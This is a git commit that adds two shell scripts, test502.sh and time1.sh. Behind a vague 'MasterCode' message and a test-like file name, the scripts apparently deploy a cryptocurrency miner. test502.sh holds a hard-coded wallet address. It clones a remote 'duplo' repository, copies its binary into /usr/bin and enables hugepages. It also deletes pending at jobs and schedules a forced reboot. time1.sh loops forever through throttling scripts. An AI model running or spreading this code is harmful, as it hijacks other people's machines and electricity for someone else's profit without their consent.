02729390b5f2413da43c89b1727f46c5abafaadd
woodstolen <47105867+woodstolen@users.noreply.github.com>
2019-01-28 18:55:09 +0800

    MasterCode
    Been added a master code of project

---
+++ test502.sh
@@ -0,0 +1,42 @@
+#!/bin/bash
+
+WALLET=49ZToWnR6QwAT6ZQDFYiM5M5Fnj92o33ddteDfxrY6hqF3MJvQHVRwF5h1xfohemzwDavc8nPxqCkjha8ZammNRRQrRApPS
+ID="$(hostname)"
+MAIL=woodstolen@protonmail.com
+PASSWORD=$ID:$MAIL
+THREADS="$(nproc --all)"
+
+
+rm -rf /tmp/duplo/
+for i in `atq | awk '{print $1}'`;do atrm $i;done
+sudo dpkg --configure -a
+echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
+sudo sysctl -p
+sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
+sleep 2
+cd /tmp && mkdir duplo
+git clone https://github.com/duplo1/duplom.git /tmp/duplo
+cd /tmp/duplo
+chmod +x /tmp/duplo/duplo
+chmod 777 ./*.sh
+cp /tmp/duplo/duplo /usr/bin/
+sleep 3
+
+touch /tmp/at.txt
+echo 'sudo reboot -f' >> /tmp/at.txt
+at now + 3 hours < /tmp/at.txt
+echo -e 'Restart job specified'
+sleep 3
+sudo apt-get install dos2unix
+
+dos2unix time1.sh
+dos2unix 75.sh
+dos2unix 50.sh
+dos2unix 80.sh
+dos2unix 65.sh
+dos2unix 90.sh
+dos2unix 40.sh
+
+sudo ./time1.sh
+
+
---
+++ time1.sh
@@ -0,0 +1,22 @@
+#!/bin/sh
+echo "Start"
+while (true) 
+do
+ ./75.sh;
+ sleep 180; 
+  ./50.sh;
+ sleep 210; 
+   ./80.sh;
+ sleep 300; 
+   ./65.sh;
+ sleep 210; 
+   ./90.sh;
+ sleep 300; 
+  ./40.sh;
+ sleep 180; 
+done;
+
+
+
+
+
